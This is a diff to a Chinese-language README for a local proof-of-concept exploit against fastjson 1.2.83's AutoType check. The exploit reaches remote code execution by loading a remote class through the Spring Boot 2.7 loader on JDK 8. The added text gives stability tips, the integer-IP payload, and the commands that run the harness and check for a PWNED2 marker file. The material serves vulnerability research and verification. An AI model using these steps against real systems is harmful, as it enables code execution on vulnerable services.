@@ -33,6 +33,21 @@ JSON.parse(payload);
 | 执行点 | 反序列化 setter / 二次调用 | **远程类 `<clinit>`**（parse 内 load/init） |
 | 环境 | 视具体 gadget | **强依赖 ClassLoader + JDK8** |
 
+
+## 稳定性说明（本地必读）
+
+1. **完整 RCE 请使用 JDK 8**。JDK 9+ 通常只能打到 SSRF。
+2. harness 默认 `-Dpoc.hostToken=localhost`：  
+   - `localhost` 不含 `.`，能正确通过 `typeName.replace('.', '/')` 还原 URL；  
+   - 且更不容易被 macOS **系统 HTTP 代理**劫持。  
+3. 经典整数 IP payload `2130706433`（=127.0.0.1）在开启系统代理时可能 **连不上本地 probe**（表现为 `getResource=null` / 超时 / 无 RCE）。  
+   - 仍可用：`POC_HOST_TOKEN=2130706433 bash scripts/verify-local.sh`  
+   - 同时建议关闭代理或确保 `http.nonProxyHosts` 覆盖该目标。  
+4. 脚本会自动：选可用端口、按 host/port 重生成 `probe.jar`、清理残留监听、禁用 JVM 系统代理、失败重试。  
+5. 一键验证：`bash scripts/verify-local.sh`  
+6. 压测：`bash scripts/stability-check.sh 20`
+
+
 ## 原理（极简）
 
 `ParserConfig.checkAutoType` 在 AutoType 关闭时仍会：
@@ -120,13 +135,19 @@ java -cp "target/classes:lib/fastjson-1.2.83.jar" Test parse-default
 ### 3. 完整 RCE：Spring Boot 2.7 Loader + JDK 8
 
 ```bash
-# 确保没有旧标记
+# 一键稳定验证（失败自动重试 3 次；运行时会自选可用端口并重生成 probe.jar）
+bash scripts/verify-local.sh
+
+# 或手动：
 python3 -c "from pathlib import Path; Path('PWNED2').unlink(missing_ok=True)"
-
-java -cp "target/classes:lib/fastjson-1.2.83.jar:lib/spring-boot-loader-2.7.18.jar" Test2 sb27-parse
-
+java -cp "target/classes:lib/fastjson-1.2.83.jar:lib/spring-boot-loader-2.7.18.jar:lib/asm-9.6.jar" Test2 sb27-parse
 ls -la PWNED2
+
+# 稳定性压测（默认 10 次）
+bash scripts/stability-check.sh 10
 ```
+
+> harness 稳定性说明：`Test2` 会绑定 `127.0.0.1`、端口冲突时自动换端口，并按端口实时生成匹配的 `probe.jar`；HTTP 并发请求用 worker 线程处理；`sb27-parse` 仅在写出 `PWNED2` 时返回 0。
 
 预期关键输出：
 
